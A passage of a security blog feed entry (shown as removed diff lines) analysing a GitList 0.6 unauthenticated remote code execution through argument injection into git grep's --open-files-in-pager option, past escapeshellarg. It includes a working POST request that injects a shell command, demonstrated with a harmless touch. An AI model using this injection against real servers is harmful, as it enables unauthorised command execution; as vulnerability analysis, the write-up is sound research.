-<p>在<a href="https://git-scm.com/docs/git-grep#git-grep---open-files-in-pagerltpagergt" target="_blank" rel="external"><code>git grep</code>命令</a>中提到：</p>
-<blockquote>
-<p>Open the matching files in the pager (not the output of grep). If the pager happens to be “less” or “vi”, and the user specified only one pattern, the first file is positioned at the first match automatically. The pager argument is optional; if specified, it must be stuck to the option without a space. If pager is unspecified, the default pager will be used (see core.pager in git-config[1]).</p>
-</blockquote>
-<p>本意上，这个参数的作用是可以选择pager，比如less或者vi，在查找到匹配的文件后使用指定的pager打开。比如匹配到的文件是README.md，则相当于执行<code>vi READEME.md</code>或<code>less README.md</code>。但倘若我们指定<code>--open-files-in-pager=id;</code>，注意有一个<code>;</code>，则在匹配到文件后，则相当于执行<code>id; README.md</code>，在unix中分号表示顺序的执行各条命令而不关心是否失败。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/3.png?raw=true" alt=""></p>
-<p>不过在执行之前经过了<code>escapeshellarg</code>，会在字符串两边加上单引号，这会有影响吗？不会。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/4.png?raw=true" alt=""></p>
-<p>所以当构造如下的数据包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/c/search HTTP/1.1</div><div class="line"></div><div class="line">query=--open-files-in-pager=touch /tmp/test/chybeta</div></pre></td></tr></table></figure></p>
-<p>注意修改了<code>tree/master/search</code> 为<code>tree/c/search</code>，也即使<code>branch</code>值为<code>c</code>，这样拼接出来的最后的语句即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;--open-files-in-pager=touch /tmp/test/chybeta&apos; c</div></pre></td></tr></table></figure></p>
-<p>当进行查找时，由于READEME.md（内容为chybeta）中含有字符<code>c</code>，因此可以查找成功，之后由于注入参数的关系，将会执行<code>touch /tmp/test/chybeta</code>，将会在/tmp/test/目录下创建一个新的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/5.png?raw=true" alt=""></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://xz.aliyun.com/t/2315" target="_blank" rel="external">谈escapeshellarg绕过与参数注入漏洞</a></li>
-<li><a href="https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html" target="_blank" rel="external">Exploit/bypass PHP escapeshellarg/escapeshellcmd functions</a></li>
-<li><a href="http://hatriot.github.io/blog/2014/06/29/gitlist-rce/" target="_blank" rel="external">Gitlist - Commit to Rce</a></li>
-<li><a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;GitList 0.6 Unauthenticated RCE 分析&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="gitlist" scheme="http://chybeta.github.io/tags/gitlist/"/>
     
   </entry>
   
